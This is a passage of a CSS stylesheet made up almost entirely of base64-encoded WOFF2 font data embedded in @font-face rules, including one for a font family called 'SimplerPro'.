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)format("woff2")
            }

            @font-face {
                font-family: "SimplerPro";
                font-style: normal;
                font-weight: 400;
                src: url(data:font/woff2;base64,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